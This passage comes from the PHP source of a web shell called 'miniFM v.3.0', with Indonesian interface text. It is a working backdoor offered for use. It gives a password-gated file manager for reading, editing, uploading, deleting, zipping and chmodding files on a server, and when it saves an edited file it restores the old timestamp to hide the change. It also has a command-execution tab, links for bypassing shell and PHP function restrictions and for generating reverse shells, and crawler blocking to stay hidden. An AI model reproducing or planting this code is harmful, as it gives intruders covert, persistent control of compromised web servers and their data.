	} else if($_GET['act'] == 'chmod'){
		if(isset($_POST['xperm']) && !empty($_POST['xperm'])){
			$xperm = $_POST['xperm'];
			$xtype = $_POST['xtype'];
			$xname = $_POST['xname'];
			$xpath = $_POST['xpath'];
			$perms = 0;
			for($i=strlen($xperm)-1;$i>=0;--$i){
				$perms += (int)$xperm[$i]*pow(8, (strlen($xperm)-$i-1));
			}
			$cm = @chmod("{$xpath}/{$xname}", $perms);
			$outss = $cm == true ? 'chmod '.$xtype.': '.$xname.', berhasil!' : 'chmod '.$xtype.': '.$xname.', gagal!';
		} else {
			$outss = 'Permission tidak boleh kosong!';
		}
		clearstatcache();
		echo $outss;
		die();
	} else if($_GET['act'] == 'del'){
		if(isset($_POST['xtype'], $_POST['xname'], $_POST['xpath'])){
			$df = $_POST['xpath'] .'/'. $_POST['xname'];
			if(@is_dir($df)){
				xrmdir($df);
				$outss = file_exists($df) ? "Hapus dir gagal!" : "Hapus dir sukses!";
			} else if(@is_file($df)){
				@unlink($df);
				$outss = file_exists($df) ? "Hapus file gagal!" : "Hapus file sukses!";
			}
			echo $outss;
			die();
		}
	} else if($_GET['act'] == 'zip'){
		if(class_exists('ZipArchive')){
			$zip = new ZipArchive();
			$df = $_POST['xpath'] .'/'. $_POST['xname'];
			$fnm = explode('.', $_POST['xname']);
			$newname = count($fnm)>0 ? $_POST['xpath']."/".current($fnm) : $df;
			if(file_exists($newname.'.zip')){
				unlink($_POST['xpath'].'/'.$newname.'.zip');
			}
			if($zip->open($newname.'.zip', ZipArchive::CREATE)){
				if(@is_dir($df)){
					$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($df.'/', FilesystemIterator::SKIP_DOTS));
					foreach($files as $key => $value){
						$zip->addFile(realpath($key), $key);
					}
				} else {
					$zip->addFile($df);
				}
				$outss = $_POST['xname'].' zipped!';
			} else {
				$outss = 'Tidak dapat menganalisa dir/file';
			}
			$zip->close();
		} else {
			$outss = 'module ZipArchive tidak terinstall!';			
		}
		echo $outss;
		die();
	} else if($_GET['act'] == 'unzip'){
		if(class_exists('ZipArchive')){
			$zip = new ZipArchive();
			$df = $_POST['xpath'] .'/'. $_POST['xname'];
			if($zip->open($df)) {
				$zip->extractTo($_POST['xpath']);
				$outss = $_POST['xname'].' extracted!';
				$zip->close();
			} else {
				$outss = $_POST['xname'].' gagal di unzip!';
			}
		} else {
			$outss = 'module ZipArchive tidak terinstall!';
		}
		echo $outss;
		die();
	} else if($_GET['act'] == 'path'){
		$_SESSION['path'] = isset($_GET['dir']) && !empty($_GET['dir']) ? $_GET['dir'] : $_SESSION['path'];
		if(isset($_GET['opt'], $_GET['entry'])){
			$df = $_SESSION['path'] .'/'. $_GET['entry'];
			if($_GET['opt'] == 'newfile'){
				$xdata = isset($_POST['xdata']) ? base64_decode($_POST['xdata']) : '';
				if(AvFunc(array('fopen','fwrite','fclose'))){
					$fp = @fopen($df, 'w');
					if($fp){
						@fwrite($fp, $xdata);
						@fclose($fp);
						$dout = "{$_GET['entry']} berhasil dibuat!";
					} else {
						$dout = "{$_GET['entry']} gagal dibuat!";
					}
				} else if(AvFunc(array('file_put_contents'))){
					file_put_contents($df, $xdata);
					$outs = file_exists($df) ? "{$_GET['entry']} berhasil dibuat!" : "{$_GET['entry']} gagal dibuat!";
				} else {
					$outs = "{$_GET['entry']} gagal dibuat!";
				}
			} else if($_GET['opt'] == 'edit'){
				if(isset($_POST['xdata'])){
					$_POST['xdata'] = base64_decode($_POST['xdata']);
					$time = @filemtime($df);
					if(AvFunc(array('fopen','fwrite','fclose'))){
						$fp = @fopen($df, 'w');
						if($fp){
							@fwrite($fp, $_POST['xdata']);
							@fclose($fp);
							@touch($df, $time, $time);
							$dout = "{$_GET['entry']} berhasil di-edit!";
						} else {
							$dout = "{$_GET['entry']} gagal di-edit!";
						}
					} else if(AvFunc(array('file_put_contents'))){
						file_put_contents($df, $_POST['xdata']);						
						@touch($df, $time, $time);
						$dout = file_exists($df) ? "{$_GET['entry']} berhasil di-edit!" : "{$_GET['entry']} gagal di-edit!";
					} else {
						$dout = "{$_GET['entry']} tidak dapat di-edit!";
					}
				} else {
					if(!is_writable($df)){
						$dout = "Disini gk bisa edit file/direktori!";
					} else {
						$dout = "";
						if(AvFunc(array('fopen','fread','fclose'))){
							$fp = @fopen($df, 'r');
							if($fp){
								while(!@feof($fp)){$dout .= htmlspecialchars(@fread($fp, @filesize($df)));}
								@fclose($fp);
							}
						} else{
							$dout = "Gagal edit {$_GET['entry']}!";
						}
					}
				}
			} else if($_GET['opt'] == 'download'){
				if(isset($_GET['dir'], $_GET['entry'])){
					$df = $_GET['dir'] .'/'. $_GET['entry'];
					if(@is_file($df) && @is_readable($df)){
						header('Pragma: public');
						header('Expires: 0');
						header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); 
						header('Content-Type: application/force-download');
						header('Content-Type: application/download');
						header('Content-Type: '.(function_exists('mime_content_type') ? @mime_content_type($df) : 'application/octet-stream'));
						header('Content-Description: File Transfer');
						header('Content-Disposition: attachment; filename='.basename($df));
						header('Content-Length: '.@filesize($df));
						header('Content-Transfer-Encoding: binary');
						$fp = @fopen($df, 'r');
						if($fp){
							while(!@feof($fp)) echo @fread($fp, @filesize($df));
							fclose($fp);
						}
						exit();
					} else {
						echo "File tidak dapat di download!'"; exit();
					}
				} else {
					echo "Tidak ada file yang dipilih!"; exit();
				}
			} else {
				$dout = '';
				if(@filesize($df)>0){
					if(AvFunc(array('fopen','fread','fclose'))){
						$fp = @fopen($df, 'r');
						if($fp){
							while(!@feof($fp)){$dout .= htmlspecialchars(@fread($fp, @filesize($df)));}
							@fclose($fp);
						}
					} else if(AvFunc(array('file_get_contents'))){
						$dout .= @file_get_contents($df);
					} else {
						$dout .= "{$_GET['entry']} ini gak bisa dibaca!";
					}
				} else {
					if(AvFunc(array('file_get_contents'))){
						$dout .= @file_get_contents($df);
					}
				}
			}
			echo $dout;
		} else {
			echo filemanager($_SESSION['path']);
		}
		die();
	} else if($_GET['act'] == 'logout'){
		unset($_SESSION['auth'], $_SESSION['path']);
		header('location: '.$_SERVER['PHP_SELF']);
		exit();
	}
}
if(isset($_POST['xpass'])){
	if(password_verify($_POST['xpass'], $auth_pass)){
		$_SESSION['auth'] = $auth_pass;
		$_SESSION['path'] = $lokasiberkas;
		header('location: '.$_SERVER['PHP_SELF']);
		exit();
	} else {
		$statusLogin[] = 'wrong password :(';
	}
}
if(!isset($_SESSION['auth'])){
	blockCrawler();
	echo "<html>
		<head><meta name='viewport' content='width=device-width, initial-scale=1'/><link rel='shortcut icon' href='https://clipart-library.com/data_images/554935.png'/><title>Restricted area</title><link rel='preconnect' href='https://fonts.googleapis.com'><link rel='preconnect' href='https://fonts.gstatic.com' crossorigin/><link href='https://fonts.googleapis.com/css2?family=Montserrat:ital@0;1&display=swap' rel='stylesheet'/></head>
		<body style='font-family: \"Montserrat\", sans-serif;'>
			<form action='' method='post'>
				<fieldset style='background-color:#eeeeee; border-radius:.3em; border:.5px solid #0066b6;'>
					<legend style='background-color:#0066b6; color:#fff; padding:5px 10px; border-radius:.3em;'>auth login:</legend>
					<label for='xpass'>pwd:</label>
					<input type='password' id='xpass' name='xpass' style='margin:5px; padding:5px 10px; border-radius:.3em; border:.5px solid #0066b6;'></input><input type='submit' value='GO' style='background-color:#0066b6; color:#fff; margin:5px; padding:5px 10px; border-radius:.3em; border:0;'></input>
					".(isset($statusLogin) ? "<br/><small style='color:#ff0000; font-style:italic;'>{$statusLogin[0]}</small>" : "")."
				</fieldset>
			</form>
		</body>
	</html>";
	die();
} else {
	blockCrawler();
?>
<!doctype html>
<html lang="en" class="bg-dark h-100">
	<head>
		<meta charset="utf-8"/>
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
		<link rel="shortcut icon" href="https://clipart-library.com/data_images/554935.png"/>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css" integrity="sha512-rt/SrQ4UNIaGfDyEXZtNcyWvQeOq0QLygHluFQcSjaGB04IxWhal71tKuzP6K8eYXYB6vJV4pHkXcmFGGQ1/0w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
		<title><?php echo $stitle;?></title>
		<style>:root{--bg-icon:#149232;--bg-success:#00d433;--bs-success-rgb:0,212,51;--bs-danger-rgb:220,53,69}.modal .modal-body,body,html{background:#2b2f34}body button{color:#eee}.blockquote,body{font-size:1em}body{padding-top:5.25rem;color:#ddd}.row{margin-left:-10px;margin-right:-10px}.col,[class*=col-]{padding-right:10px;padding-left:10px}input{font-size:1em!important}nav .nav-tabs{border-bottom:1px solid #0066b6}nav .nav-tabs .nav-link.active{background:#0066b6;color:#fff}nav .nav-tabs .nav-link.active svg path{fill:#ffffff!important}nav .nav-tabs .nav-link.active,nav .nav-tabs .nav-link:focus,nav .nav-tabs .nav-link:hover{border:1px solid #0066b6}table{border-radius:10px}table td,table th{border-top:1px solid #444c54!important}table tr:nth-child(odd){background:rgb(var(--bs-success-rgb),5%)}table thead th{background:rgb(var(--bs-success-rgb),20%);border-top:0 solid #eee!important;border-bottom:2px solid var(--bg-success)!important}table thead tr th:first-child{border-top-left-radius:.25rem}table thead tr th:last-child{border-top-right-radius:.25rem}.breadcrumb-item a,table tbody{color:#cfdce8}table tbody tr:hover td{color:#fff;transition:.3s}table tbody tr:hover{background:rgb(var(--bs-success-rgb),10%)}.breadcrumb{background:linear-gradient(45deg,rgb(var(--bs-success-rgb),20%),transparent);padding:2px 10px}.breadcrumb-item a:hover{color:var(--bg-success)}.breadcrumb-item+.breadcrumb-item{padding-left:.2rem}.breadcrumb-item+.breadcrumb-item::before{padding-right:.2rem}.form-control-sm{height:auto}.form-control:disabled,.form-control[readonly]{background:#272c31;color:#767676}.media.dir svg{margin:auto;padding-right:.5em}.media.file svg{margin:auto;padding:0 .7em 0 .25em}.fsmall{display:block;font-size:1.75vh;color:#61aa64}.bg-success-rgb,.input-group-prepend *{background:rgb(var(--bs-success-rgb),30%);border:1px solid rgb(var(--bs-success-rgb),50%);color:rgb(var(--bs-success-rgb),90%)}#hasilcommand *,input[type=text],input[type=text]:active,input[type=text]:focus{background:#343a40;color:#cfdce8}.custom-select{padding:5px 10px;color:#cfdce8;background:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23149232' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") right .75rem center/8px 10px no-repeat #343a40}.custom-file *{background:#343a40;color:#cfdce8;border:1px solid rgb(var(--bs-success-rgb),50%)}.custom-file-label::after{content:"multiple";color:var(--success);background:#2b2f34}#hasilcommand .card{border-radius:.25rem;border:1px solid rgb(var(--bs-success-rgb),50%)}#hasilcommand .card .card-body{border-radius:.25rem}.text-success{color:rgb(0,212,51,90%)!important;color:#eee}@media screen and (max-width:420px){nav .nav-tabs .nav-link{padding:.5rem 1rem;letter-spacing:-.1em}.btn{padding:0 10px!important}}@media screen and (max-width:767px){body{padding-top:4rem;}.container{max-width:100%!important}.blockquote,.btn,.input-group-text,body{font-size:.8em!important}.fsmall{font-size:1.5vh}.form-control-sm{font-size:initial;height:auto}.custom-select{font-size:inherit;height:auto!important}.custom-file,.custom-file-input,.custom-file-label{height:calc(1.5em + .75rem)!important}}</style>
	</head>
	<body class="text-monospace">
		<header class="header bg-dark fixed-top mt-auto py-md-3 py-2">
			<div class="container text-center my-2">
				<span class="text-light"><?php echo $stitle;?></span>
			</div>
		</header>
		<div class="container">
			<nav>
				<div class="nav nav-tabs" id="nav-tab" role="tablist">
					<button class="nav-link active" id="fmanager" data-toggle="tab" data-target="#nav-berkas" data-tempdir="<?php echo $_SESSION['path'];?>" type="button" role="tab" aria-controls="nav-berkas" aria-selected="true">
						<svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 576 512" class="d-block d-sm-none"><path fill="var(--bg-icon)" d="M384 480h48c11.4 0 21.9-6 27.6-15.9l112-192c5.8-9.9 5.8-22.1 .1-32.1S555.5 224 544 224H144c-11.4 0-21.9 6-27.6 15.9L48 357.1V96c0-8.8 7.2-16 16-16H181.5c4.2 0 8.3 1.7 11.3 4.7l26.5 26.5c21 21 49.5 32.8 79.2 32.8H416c8.8 0 16 7.2 16 16v32h48V160c0-35.3-28.7-64-64-64H298.5c-17 0-33.3-6.7-45.3-18.7L226.7 50.7c-12-12-28.3-18.7-45.3-18.7H64C28.7 32 0 60.7 0 96V416c0 35.3 28.7 64 64 64H87.7 384z"/></svg>
						<span class="d-none d-sm-block">Files</span>
					</button>
					<button class="nav-link" data-toggle="tab" data-target="#nav-cmd" type="button" role="tab" aria-controls="nav-cmd" aria-selected="false">
						<svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 576 512" class="d-block d-sm-none"><path fill="var(--bg-icon)" d="M9.4 86.6C-3.1 74.1-3.1 53.9 9.4 41.4s32.8-12.5 45.3 0l192 192c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L178.7 256 9.4 86.6zM256 416H544c17.7 0 32 14.3 32 32s-14.3 32-32 32H256c-17.7 0-32-14.3-32-32s14.3-32 32-32z"/></svg>
						<span class="d-none d-sm-block">Command</span>
					</button>
					<button class="nav-link" data-toggle="tab" data-target="#nav-info" type="button" role="tab" aria-controls="nav-info" aria-selected="false">
						<svg xmlns="http://www.w3.org/2000/svg" height="1.2em" viewBox="0 0 16 16" class="d-block d-sm-none"><path fill="var(--bg-icon)" d="M8,0 C12.4183,0 16,3.58173 16,8 C16,12.4183 12.4183,16 8,16 C3.58167,16 0,12.4183 0,8 C0,3.58173 3.58167,0 8,0 Z M8,2 C4.68628,2 2,4.68628 2,8 C2,11.3137 4.68628,14 8,14 C11.3137,14 14,11.3137 14,8 C14,4.68628 11.3137,2 8,2 Z M8,7 C8.51280357,7 8.93550255,7.38604429 8.99327177,7.88337975 L9,8 L9,11 C9,11.5523 8.55225,12 8,12 C7.48719643,12 7.06449745,11.613973 7.00672823,11.1166239 L7,11 L7,8 C7,7.44772 7.44775,7 8,7 Z M8,4 C8.55225,4 9,4.44772 9,5 C9,5.55228 8.55225,6 8,6 C7.44775,6 7,5.55228 7,5 C7,4.44772 7.44775,4 8,4 Z"/></svg>
						<span class="d-none d-sm-block">Info</span>
					</button>
					<a class="nav-link ml-auto bg-danger text-white" type="button" href="?act=logout">
						<svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 512 512" class="d-block d-sm-none"><path fill="#ffffff" d="M377.9 105.9L500.7 228.7c7.2 7.2 11.3 17.1 11.3 27.3s-4.1 20.1-11.3 27.3L377.9 406.1c-6.4 6.4-15 9.9-24 9.9c-18.7 0-33.9-15.2-33.9-33.9l0-62.1-128 0c-17.7 0-32-14.3-32-32l0-64c0-17.7 14.3-32 32-32l128 0 0-62.1c0-18.7 15.2-33.9 33.9-33.9c9 0 17.6 3.6 24 9.9zM160 96L96 96c-17.7 0-32 14.3-32 32l0 256c0 17.7 14.3 32 32 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-64 0c-53 0-96-43-96-96L0 128C0 75 43 32 96 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32z"/></svg>
						<span class="d-none d-sm-block">Logout</span>
					</a>
				</div>
			</nav>
			<div class="row mt-3 mb-n3" id="fberkas">
				<?php
				$drives = "";
				if($GLOBALS['os'] == 'win'){
					foreach(range('C','Z') as $drive){
						if(@is_dir($drive.':\\')){
							$drives .= '<a href="javascript:void(0);" id="chdrive" data-path="'.$drive.':/" class="text-light font-weight-bold">[ '.$drive.' ]</a> ';
						}						
					}
					echo "<div class='col-12 mt-n2 mb-2 text-success'><small>Drives: ".$drives."</small></div>";
				}?>
				<div class="col-sm-12 col-md-4">
					<form method="post" action="?act=readfile" class="mb-3" id="rqreadfile">
						<div class="input-group">
							<div class="input-group-prepend">
								<label class="input-group-text">ReadFile</label>
							</div>
							<input type="text" name="xpath" class="form-control form-control-sm border-success"></input>
							<div class="input-group-append">
								<button class="btn btn-outline-success" type="submit">Go</button>
							</div>
						</div>
					</form>
				</div>
				<div class="col-sm-6 col-md-4">
					<form method="post" action="?act=mkdir" class="mb-3" id="rqmkdir">
						<input type="hidden" name="xpath" value=""/>
						<div class="input-group">
							<select class="custom-select border-success" name="xtype" style="max-width:110px;">
								<option value="dir" selected>New dir</option>
								<option value="file">New file</option>
							</select>
							<input type="text" name="xdir" class="form-control form-control-sm border-success" max-length="50"></input>
							<div class="input-group-append">
								<button class="btn btn-outline-success" type="submit">Go</button>
							</div>
						</div>
					</form>
				</div>
				<div class="col-sm-6 col-md-4">
					<form method="post" action="?act=upload" class="mb-3" id="rqupload">
						<input type="hidden" name="xpath" value=""/>
						<div class="input-group">
							<div class="custom-file">
								<label class="custom-file-label" for="titupl">Upload file</label>
								<input type="file" name="xfile[]" class="custom-file-input border-success" id="titupl" aria-describedby="upld" multiple></input>
							</div>
						</div>
					</form>
				</div>
			</div>
			<div class="tab-content mt-3" id="nav-tabContent">
				<div class="tab-pane show active fade" id="nav-berkas" role="tabpanel">
					<div class="row">
						<div class='col-12 mb-3' id="fileman"></div>
					</div>
				</div>
				<div class="tab-pane fade" id="nav-cmd" role="tabpanel">
					<div class="row">
						<div class="col-12">
							<form method="post" action="?act=command" class="mb-3" id="rqcmd">
								<input type="hidden" name="xpath" value=""></input>
								<span>Command execute</span>
								<div class="input-group mt-2">
									<input type="text" class="form-control form-control-sm border-success" name="cmd" placeholder="uname -a"></input>
									<div class="input-group-append">
										<button class="btn btn-sm btn-outline-success" type="submit">Go</button>
									</div>
								</div>
							</form>
						</div>
						<div class="col-12" id="hasilcommand"></div>
						<div class="col-12 mb-3">
							<span>Bypass Assistance:</span>
							<ul class="ml-n4">
								<li><a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions" target="_blank">Linux Restrictions</a></li>
								<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass" target="_blank">PHP - Useful Functions</a></li>
								<li><a href="https://www.revshells.com/" target="_blank">Reverse shell generator</a></li>
							</ul>
						</div>
					</div>
				</div>
				<div class="tab-pane fade" id="nav-info" role="tabpanel">
					<div class="row">
						<div class="col-12 mb-3" id="showinfo"></div>
					</div>
				</div>
			</div>
			<div class="position-fixed top-0 right-0 p-3" id="shownotif" style="z-index:1031; right:0; top:0;"></div>
		</div>
		<div class="modal fade" id="modalshowaksi" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
				<div class="modal-content bg-dark">
					<div class="modal-header bg-dark border-secondary">
						<h5 class="modal-title text-break text-light" id="staticBackdropLabel">title</h5>
						<button type="button" class="close text-light" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
					</div>
					<div class="modal-body"></div>
				</div>
			</div>
		</div>
		<div class="modal fade" id="showchmod" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
				<div class="modal-content bg-dark">
					<div class="modal-header bg-dark border-secondary">
						<h5 class="modal-title text-break text-light" id="staticBackdropLabel">Change permissions</h5>
						<button type="button" class="close text-light" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
					</div>
					<div class="modal-body">
						<form method="post" action="?act=chmod" class="mb-3" id="rqchmod">
							<input type="hidden" name="xtype" value=""></input>
							<input type="hidden" name="xname" value=""></input>
							<input type="hidden" name="xpath" value=""></input>
							<div class="form-group row">
								<label for="xname" class="col-sm-2 col-form-label">File</label>
								<div class="col-sm-10">
									<input type="text" class="form-control border-success" id="xname" readonly="readonly" value="" max-length="4"/>
								</div>
							</div>
							<div class="form-group row">
								<label for="xperm" class="col-sm-2 col-form-label">Permission</label>
								<div class="col-sm-10">
									<div class="input-group mb-3">
										<input type="text" class="form-control border-success" id="xperm" name="xperm" value=""/>
										<div class="input-group-append">
											<button class="btn btn-outline-success" type="submit">GO</button>
										</div>
									</div>
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>			
		</div>
		<footer class="footer bg-dark mt-auto py-md-3 py-2">
			<div class="container">
				<blockquote class="blockquote text-center mb-0">
					<p class="text-light mb-0">miniFM v.3.0</p>
					<footer class="blockquote-footer">By.<cite>Z190T</cite></footer>
				</blockquote>
			</div>
		</footer>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/js/bootstrap.bundle.min.js" integrity="sha512-igl8WEUuas9k5dtnhKqyyld6TzzRjvMqLC79jkgT3z02FvJyHAuUtyemm/P/jYSne1xwFI06ezQxEwweaiV7VA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
		<script>!function(t){var a='<span class="bg-transparent"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" style="margin:auto; padding-right:.5em; background:transparent;"><style>.spinner{transform-origin:center;animation:spinners .75s infinite linear}@keyframes spinners{100%{transform:rotate(360deg)}}</style><path d="M12,1A11,11,0,1,0,23,12,11,11,0,0,0,12,1Zm0,19a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" opacity=".25"/><path fill="var(--light)" class="spinner" d="M10.72,19.9a8,8,0,0,1-6.5-9.79A7.77,7.77,0,0,1,10.4,4.16a8,8,0,0,1,9.49,6.52A1.54,1.54,0,0,0,21.38,12h.13a1.37,1.37,0,0,0,1.38-1.54,11,11,0,1,0-12.7,12.39A1.54,1.54,0,0,0,12,21.34h0A1.47,1.47,0,0,0,10.72,19.9Z"/></svg>Tunggu bentar...</span>';let e={bs64ToBit:function(t){let a=atob(t);return Uint8Array.from(a,t=>t.codePointAt(0))},btTobs64:function(t){let a=String.fromCodePoint(...t);return btoa(a)},isWellFormed:function(t){if(void 0!==t)return t.isWellFormed();try{return encodeURIComponent(t),!0}catch(a){return!1}},encode:function(t){return e.isWellFormed(t)?e.btTobs64(new TextEncoder().encode(t)):""},decode:function(t){return e.isWellFormed(t)?new TextDecoder().decode(e.bs64ToBit(t)):""}},n=(a,e)=>{t("#shownotif").html('<div id="liveToast" class="toast hide" role="alert" aria-live="assertive" aria-atomic="true" data-delay="10000"><div class="toast-header"><img src="https://clipart-library.com/data_images/554935.png" width="20" class="rounded mr-2" alt="icon"/><strong class="mr-auto">'+a+'</strong><button type="button" class="ml-2 mb-1 close" data-dismiss="toast" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="toast-body text-secondary">'+e+"</div></div>"),t(".toast").toast("show")};function i(e,i,o,r){var d=t("#modalshowaksi").find(".modal-body");t.ajax({type:"get",url:"?act=path&dir="+i+"&entry="+o+"&opt="+e,beforeSend:function(){d.html(a)}}).done(function(t){d.html(""),r(t)}).fail(function(t,a,e){n("Error",t.status),d.html("error_code: "+t.status)})}function o(a){for(var e=0;e<a.length;e++)a[e].addEventListener("change",function(a){var e=t("option:selected",this)[0],n=e.value,o=t("#modalshowaksi"),r="",d="",l=e.attributes["data-xtype"],s=e.attributes["data-xname"],m=e.attributes["data-xpath"],f=a.currentTarget;if(n.length>0){switch(n){case"rename":d="Rename "+l.value.toUpperCase(),r='<form method="post" action="?act=rename" id="rqrename"><input type="hidden" name="xtype" value="'+l.value+'"/><input type="hidden" name="xpath" value="'+m.value+'"/><div class="form-group row"><label for="oname" class="col-sm-2 col-form-label">Name</label><div class="col-sm-10"><input type="text" class="form-control border-success" id="oname" name="oname" readonly="readonly" value="'+s.value+'"/></div></div><div class="form-group row"><label for="xname" class="col-sm-2 col-form-label">Rename</label><div class="col-sm-10"><div class="input-group mb-3"><input type="text" class="form-control border-success" id="xname" name="xname" value="'+s.value+'"/><div class="input-group-append"><button class="btn btn-outline-success" type="submit">GO</button></div></div></div></div></form>';break;case"touch":d="Touch "+l.value.toUpperCase()+" ("+s.value+")",r='<form method="post" action="?act=touch" id="rqtouch"><input type="hidden" name="xtype" value="'+l.value+'"/><input type="hidden" name="xpath" value="'+m.value+'"/><input type="hidden" name="xname" value="'+s.value+'"/><div class="form-group row"><label for="xtime" class="col-sm-2 col-form-label">Datetime</label><div class="col-sm-10"><div class="input-group"><input type="text" class="form-control border-success" id="xtime" name="xtime" value="'+e.attributes["data-xtime"].value+'"/><div class="input-group-append"><button class="btn btn-outline-success" type="submit">GO</button></div></div></div></div></form>'}"download"==n?window.open("?act=path&dir="+m.value+"&entry="+s.value+"&opt="+n,"_blank"):"del"==n||"zip"==n||"unzip"==n?(o.modal("show"),o.find(".modal-title").html(n+" /"+s.value),o.find(".modal-body").html('<form method="post" action="?act='+n+'" id="rq'+n+'" class="text-center"><input type="hidden" name="xtype" value="'+l.value+'"/><input type="hidden" name="xname" value="'+s.value+'"/><input type="hidden" name="xpath" value="'+m.value+'"/><div class="alert alert-info">Klik proses utk melanjutkan!!</div><button class="btn btn-outline-success" type="submit">Proses!</button></form>'),o.on("hidden.bs.modal",function(t){o.find(".modal-title").html("unknown"),o.find(".modal-body").html("null"),f.value=""})):"edit"==n?(o.modal("show"),o.find(".modal-body").addClass("pt-0 px-0"),o.find(".modal-title").html("Edit "+l.value.toUpperCase()+": /"+s.value),i("view",m.value,s.value,function(t){var a='<form method="post" action="?act=path&dir='+m.value+"&entry="+s.value+'&opt=edit" id="rqeditfile"><div class="d-block mb-3"><textarea name="xdata" class="form-control rounded-0" style="white-space:pre;" rows="20">'+t+'</textarea></div><center><button class="btn btn-outline-success text-center" type="submit">Simpan</button></center></form>';o.find(".modal-body").html(a)}),o.on("hidden.bs.modal",function(t){o.find(".modal-title").html("unknown"),o.find(".modal-body").removeClass("pt-0 px-0").html("null"),f.value=""})):"view"==n?(o.modal("show"),o.find(".modal-title").html("View "+l.value.toUpperCase()+": /"+s.value),i("view",m.value,s.value,function(t){o.find(".modal-body").attr("style","background:#dfdfdf;").addClass("rounded-0").html('<code><pre class="mb-0">'+t+"</pre></code>")}),o.on("hidden.bs.modal",function(t){o.find(".modal-title").html("unknown"),o.find(".modal-body").attr("style","").removeClass("rounded-0").html("null"),f.value=""})):(o.modal("show"),o.find(".modal-title").html(d),o.find(".modal-body").html(r),o.on("hidden.bs.modal",function(t){o.find(".modal-title").html("unknown"),o.find(".modal-body").html("null"),f.value=""}))}else o.modal("show"),o.find(".modal-title").html("View null"),i("view",m.value,s.value,function(t){o.find(".modal-body").attr("style","background:#dfdfdf;").html("<code>null</code>")}),o.on("hidden.bs.modal",function(t){o.find(".modal-title").html("unknown"),o.find(".modal-body").attr("style","").html("null"),f.value=""})},!1)}function r(e,i){t.ajax({type:"get",url:"?act=path&dir="+e,timeout:5e3,beforeSend:function(){t("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()}}).done(function(a,n,o){t("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(e),t("form#rqcmd").find('input[name="xpath"]').val(e),t("button#fmanager").attr("data-tempdir",e),i(a)}).fail(function(a,i,o){t("#fileman").html(i+", response code: "+a.status),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide(),t("form#rqcmd").find('input[name="xpath"]').val(e),t("button#fmanager").attr("data-tempdir",e),n("Error",i+", response code: "+a.status)})}t(document).on("click","a#chdrive",function(e){e.preventDefault();var n=t(e.currentTarget).attr("data-path");t.ajax({type:"get",url:"?act=path&dir="+n,beforeSend:function(){t("body").find("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(a){t("body").find("#fileman").html(a),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(n),t("form#rqcmd").find('input[name="xpath"]').val(n)}}).done(function(){o(document.querySelectorAll("#showaksi")),t("form#rqcmd").find('input[name="xpath"]').val(n),t("form#rqcmd").parent().find("#hasilcommand").html("")})}),t(document).on("click","a#chdir",function(a){a.preventDefault();var e=t(a.currentTarget).attr("data-path");t("ol.breadcrumb").addClass("pl-0").css({background:"transparent",padding:"0"}).html('<li class="breadcrumb-item w-100 active">					<form method="post" action="?act=changedir" class="mb-0" id="rqchdir">						<div class="input-group">							<input type="text" name="xpath" class="form-control form-control-sm border-success" value="'+e+'"></input>							<div class="input-group-append">								<button class="btn btn-outline-success" type="submit">Go</button>							</div>						</div>					</form></li>')}),t("button#fmanager").on("click",function(e){e.preventDefault();var 